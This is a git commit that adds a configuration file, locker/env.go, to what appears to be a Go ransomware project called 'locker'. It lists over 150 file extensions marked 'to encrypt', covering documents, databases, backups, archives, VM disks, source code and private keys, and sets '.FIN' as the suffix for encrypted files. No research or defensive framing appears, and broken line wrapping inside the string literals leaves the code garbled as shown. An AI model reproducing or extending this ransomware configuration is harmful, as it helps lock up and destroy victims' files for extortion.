7f11b82406f86a6b320d18366d483e04331c8db1
obehi.iredia@gmail.com <obehi.iredia@gmail.com>
2020-06-02 21:50:24 -0400

    Add env

---
+++ locker/env.go
@@ -0,0 +1,27 @@
+package locker
+
+// FileExt to encrypt.
+var FileExt = [...]string{
+	".DOC" , ".DOCX" , ".XLS" , ".XLSX" , ".PPT" , ".PPTX" , ".PST" , ".OST" , ".MSG" , ".EML" , ".VSD\
+" , ".VSDX" , ".TXT" , ".CSV" , ".RTF" , ".WKS" , ".WK1" , ".PDF" , ".DWG" , ".ONETOC2" , ".SNT" 
+, ".JPEG" , ".JPG" , ".DOCB" , ".DOCM" , ".DOT" , ".DOTM" , ".DOTX" , ".XLSM" , ".XLSB" , ".XLW" , 
+".XLT" , ".XLM" , ".XLC" , ".XLTX" , ".XLTM" , ".PPTM" , ".POT" , ".PPS" , ".PPSM" , ".PPSX" , ".PP\
+AM" , ".POTX" , ".POTM" , ".EDB" , ".HWP" , ".62" , ".SXI" , ".STI" , ".SLDX" , ".SLDM" , ".VDI" 
+, ".VMDK" , ".VMX" , ".GPG" , ".AES" , ".ARC" , ".PAQ" , ".BZ2" , ".TBK" , ".BAK" , ".TAR" , ".TGZ\
+" , ".GZ" , ".7Z" , ".RAR" , ".ZIP" , ".BACKUP" , ".ISO" , ".VCD" , ".BMP" , ".PNG" , ".GIF" , ".\
+RAW" , ".CGM" , ".TIF" , ".TIFF" , ".NEF" , ".PSD" , ".AI" , ".SVG" , ".DJVU" , ".M4U" , ".M3U" ,
+ ".MID" , ".WMA" , ".FLV" , ".3G2" , ".MKV" , ".3GP" , ".MP4" , ".MOV" , ".AVI" , ".ASF" , ".MPEG"
+ , ".VOB" , ".MPG" , ".WMV" , ".FLA" , ".SWF" , ".WAV" , ".MP3" , ".SH" , ".CLASS" , ".JAR" , ".JA\
+VA" , ".RB" , ".ASP" , ".PHP" , ".JSP" , ".BRD" , ".SCH" , ".DCH" , ".DIP" , ".PL" , ".VB" , ".VB\
+S" , ".PS1" , ".BAT" , ".CMD" , ".JS" , ".ASM" , ".H" , ".PAS" , ".CPP" , ".C" , ".CS" , ".SUO" 
+, ".SLN" , ".LDF" , ".MDF" , ".IBD" , ".MYI" , ".MYD" , ".FRM" , ".ODB" , ".DBF" , ".DB" , ".MDB"
+ , ".ACCDB" , ".SQL" , ".SQLITEDB" , ".SQLITE3" , ".ASC" , ".LAY6" , ".LAY" , ".MML" , ".SXM" , ".OT\
+G" , ".ODG" , ".UOP" , ".STD" , ".SXD" , ".OTP" , ".ODP" , ".WB2" , ".SLK" , ".DIF" , ".STC" , ".\
+SXC" , ".OTS" , ".ODS" , ".3DM" , ".MAX" , ".3DS" , ".UOT" , ".STW" , ".SXW" , ".OTT" , ".ODT" , 
+".PEM" , ".P12" , ".CSR" , ".CRT" , ".KEY" , ".PFX" , ".DER"
+}
+
+const (
+	// Encrypted  file extension
+	CryptoExt = ".FIN"
+)
